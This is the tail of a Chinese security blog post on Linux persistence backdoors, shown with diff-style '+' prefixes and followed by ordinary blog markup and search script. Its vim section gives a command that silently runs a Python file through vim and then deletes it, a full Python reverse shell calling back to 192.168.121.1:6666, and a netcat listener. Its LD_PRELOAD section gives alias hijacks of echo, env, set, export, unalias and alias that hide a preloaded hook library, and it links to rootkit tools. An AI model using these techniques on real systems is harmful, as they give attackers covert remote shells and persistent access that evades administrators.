+<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门</span><br><span class="line"></span><br><span class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile json.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f json.py</span><br><span class="line"></span><br><span class="line">// 脚本代码</span><br><span class="line"></span><br><span class="line">import socket, subprocess, os;</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;192.168.121.1&quot;, 6666));</span><br><span class="line">os.dup2(s.fileno(), 0);</span><br><span class="line">os.dup2(s.fileno(), 1);</span><br><span class="line">os.dup2(s.fileno(), 2);</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;]);</span><br><span class="line"></span><br><span class="line">//  攻击机监听6666端口并获取反弹的shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1) echo $LD_PRELOAD </span><br><span class="line"></span><br><span class="line">alias echo=&apos;func()&#123; echo $* | sed &quot;s!/home/hook.so! !g&quot;;&#125;;func&apos;</span><br><span class="line"></span><br><span class="line">2) env</span><br><span class="line"></span><br><span class="line">alias env=&apos;func()&#123; env $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&apos;</span><br><span class="line"></span><br><span class="line">3) set </span><br><span class="line"></span><br><span class="line">alias set=&apos;func()&#123; set $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&apos;</span><br><span class="line"></span><br><span class="line">4) export </span><br><span class="line"></span><br><span class="line">alias export=&apos;func()&#123; export $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&apos;</span><br><span class="line"></span><br><span class="line">5) unalias劫持</span><br><span class="line"></span><br><span class="line">alias unalias=&apos;func()&#123; if [ $# != 0 ]; then if [ $* != &quot;echo&quot; ]&amp;&amp;[ $* != &quot;env&quot; ]&amp;&amp;[ $* != &quot;set&quot; ]&amp;&amp;[ $* != &quot;export&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;func&apos;</span><br><span class="line"></span><br><span class="line">6) alias劫持</span><br><span class="line"></span><br><span class="line">alias alias=&apos;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&apos;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul>
+<li><a href="https://github.com/mempodippy/cub3" target="_blank" rel="noopener">https://github.com/mempodippy/cub3</a> </li>
+<li><a href="https://github.com/mempodippy/vlany" target="_blank" rel="noopener">https://github.com/mempodippy/vlany</a> </li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Persistence/" rel="tag"><i class="fa fa-tag"></i>
+
+ Persistence</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/10124/" rel="next" title="Linux应急响应进阶篇">
+                <i class="fa fa-chevron-left"></i> Linux应急响应进阶篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/50959/" rel="prev" title="服务渗透指北">
+                服务渗透指北 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/hexo.png" alt="L0n9w4y">
+            
+              <p class="site-author-name" itemprop="name">L0n9w4y</p>
+              <p class="site-description motion-element" itemprop="description">問道遠兮，求索未止...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/L0n9w4y" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/_L0n9_" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Metasploit"><span class="nav-text">0x01 Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Unix-中反弹shell的paylaod"><span class="nav-text">1. Unix 中反弹shell的paylaod</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-msfvenom-生成payload"><span class="nav-text">2. msfvenom 生成payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-meterpreter-shell"><span class="nav-text">3. meterpreter shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-计划任务后门"><span class="nav-text">0x02 计划任务后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-查找计划任务相关文件"><span class="nav-text">1. 查找计划任务相关文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-定时任务文件说明"><span class="nav-text">2. 定时任务文件说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-计划任务隐藏后门"><span class="nav-text">3. 计划任务隐藏后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SSH系列后门"><span class="nav-text">0x03 SSH系列后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-软链接后门"><span class="nav-text">1. 软链接后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SSH-Wapper-后门"><span class="nav-text">2. SSH Wapper 后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-SSH公钥后门"><span class="nav-text">3. SSH公钥后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-SSH-Keylogger"><span class="nav-text">4. SSH Keylogger</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-alias后门"><span class="nav-text">0x04 alias后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-后门存放位置"><span class="nav-text">1. 后门存放位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-后门制作"><span class="nav-text">2. 后门制作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-后门隐藏"><span class="nav-text">3. 后门隐藏</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-vim后门"><span class="nav-text">0x05 vim后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-LD-PRELOAD-后门"><span class="nav-text">0x06 LD_PRELOAD 后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境变量隐藏"><span class="nav-text">环境变量隐藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用工具"><span class="nav-text">利用工具</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
+
+  
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "./public/search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
